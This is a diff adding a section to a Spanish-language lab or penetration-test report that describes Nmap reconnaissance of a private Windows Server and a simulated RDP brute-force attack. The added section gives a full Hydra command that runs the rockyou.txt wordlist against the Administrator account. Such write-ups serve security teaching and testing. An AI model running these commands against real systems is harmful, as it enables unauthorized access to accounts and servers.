@@ -7,3 +7,8 @@ Se utilizó Nmap para descubrir servicios expuestos en el Windows Server, utiliz
 
 ```bash
 nmap -sV -sC -O -A -T4 192.168.1.10
+
+4.2 Fase 2: Ataque de Fuerza Bruta (Movimiento Lateral)
+Tras identificar el puerto 3389 (RDP) abierto, se simuló un intento de intrusión mediante fuerza bruta utilizando Hydra y el diccionario rockyou.txt contra el usuario administrador nativo:
+
+hydra -t 4 -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.10 -V
